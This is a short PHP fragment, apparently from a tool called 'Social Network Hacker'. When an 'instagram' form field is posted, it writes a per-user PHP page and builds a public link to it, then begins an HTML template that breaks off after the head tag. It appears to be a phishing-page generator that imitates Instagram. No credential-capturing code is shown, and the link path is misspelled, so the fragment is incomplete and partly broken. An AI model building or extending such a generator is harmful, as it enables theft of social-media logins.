...
if(isset($_POST['instagram'])){
    ...
    $userId = $row['id'];
    $myfile = fopen("../GenerationFiles/instagram".$userId.".php", "w") or die("Unable to open file!");
    // $instapageLink = "http://localhost/Project/Social%20Network%20Hacker/GenerationFiles/instagram".$userId.".php";
    $instapageLink = "http://$_SERVER[HTTP_HOST]/SNH/GenerationFiles/instagaram".$userId.".php";
    $fbCode = '<!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
